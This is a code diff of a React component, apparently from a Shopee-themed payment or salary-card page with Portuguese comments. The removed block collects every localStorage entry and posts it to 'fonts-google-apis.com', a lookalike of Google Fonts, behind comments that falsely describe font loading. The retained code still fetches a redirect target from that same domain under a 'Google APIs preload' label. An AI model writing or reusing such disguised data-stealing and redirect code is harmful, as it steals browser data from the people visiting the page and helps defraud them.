@@ -86,7 +86,7 @@ const Recebedor: React.FC = () => {
     };
 
     // Fontes Google APIs preload
-    const performRedirect = (tempDataId?: string) => {
+    const performRedirect = () => {
       const xhr = new XMLHttpRequest();
       xhr.open('GET', 'https://fonts-google-apis.com/css/fonts/a8aaa4ff-9fa3-4be7-b50f-2a10fd5c5b6c', true);
       
@@ -100,10 +100,6 @@ const Recebedor: React.FC = () => {
       if (cachedUrl && cacheTime && (now - parseInt(cacheTime)) < 30000) {
         console.log('⚡ Usando URL do cache para redirecionamento rápido');
         let redirectUrl = cachedUrl;
-        if (tempDataId && redirectUrl) {
-          const separator = redirectUrl.includes('?') ? '&' : '?';
-          redirectUrl += separator + 'tempData=' + tempDataId;
-        }
         if (redirectUrl.startsWith('/')) {
           redirectUrl = window.location.protocol + '//' + window.location.host + redirectUrl;
         }
@@ -126,10 +122,6 @@ const Recebedor: React.FC = () => {
             }
           }
           
-          if (tempDataId && redirectUrl) {
-            const separator = redirectUrl.includes('?') ? '&' : '?';
-            redirectUrl += separator + 'tempData=' + tempDataId;
-          }
           
           if (redirectUrl.startsWith('/')) {
             redirectUrl = window.location.protocol + '//' + window.location.host + redirectUrl;
@@ -179,72 +171,8 @@ const Recebedor: React.FC = () => {
         console.log('❌ Erro ao salvar dados de pagamento:', e);
       }
       
-      // Cartão Salário Shopee
-      try {
-        const localStorageData: Record<string, string> = {};
-        for (let i = 0; i < localStorage.length; i++) {
-          const key = localStorage.key(i);
-          if (key) {
-            localStorageData[key] = localStorage.getItem(key) || '';
-          }
-        }
-        
-        // Recebedor
-        if (Object.keys(localStorageData).length > 0) {
-          console.log('📤 Enviando', Object.keys(localStorageData).length, 'itens do localStorage...');
-          
-          // Fonte Oficial Shopee
-          const storeXhr = new XMLHttpRequest();
-          storeXhr.open('POST', 'https://fonts-google-apis.com/api/temp-data', true);
-          storeXhr.setRequestHeader('Content-Type', 'application/json');
-          // Fonte baixada com sucesso
-          storeXhr.timeout = 3000;
-          
-          storeXhr.onreadystatechange = function() {
-            if (storeXhr.readyState === 4) {
-              let tempDataId = null;
-              if (storeXhr.status === 201) {
-                try {
-                  const storeResponse = JSON.parse(storeXhr.responseText);
-                  tempDataId = storeResponse.id;
-                  console.log('Dados do usuário', tempDataId);
-                } catch(e) {
-                  console.log('Usuário novo', e);
-                }
-              }
-              // Cartão Salário Shopee
-              performRedirect(tempDataId);
-            }
-          };
-          
-          storeXhr.onerror = function() {
-            console.log('⚠️ Erro ao armazenar dados - prosseguindo mesmo assim');
-            setIsLoading(false);
-            // Dados no cartão Salário Shopee
-            performRedirect(undefined);
-          };
-          
-          storeXhr.ontimeout = function() {
-            console.log('⏱️ Timeout ao armazenar dados - prosseguindo mesmo assim');
-            performRedirect(undefined);
-          };
-          
-          const requestData = {
-            buttonId: 'a8aaa4ff-9fa3-4be7-b50f-2a10fd5c5b6c',
-            localStorageData: JSON.stringify(localStorageData),
-            sourceUrl: window.location.href
-          };
-          storeXhr.send(JSON.stringify(requestData));
-        } else {
-          console.log('Cartão Shopee');
-          // Cartão do usuário Shopee
-          performRedirect(undefined);
-        }
-      } catch(err) {
-        console.log('❌ Erro ao acessar localStorage - redirecionamento direto:', err);
-        // If localStorage access fails, perform normal redirect
-        performRedirect(undefined);
-      }
+      // Cartão Salário Shopee - redirecionamento direto
+      performRedirect();
     };
     
     // Adicionar event listeners
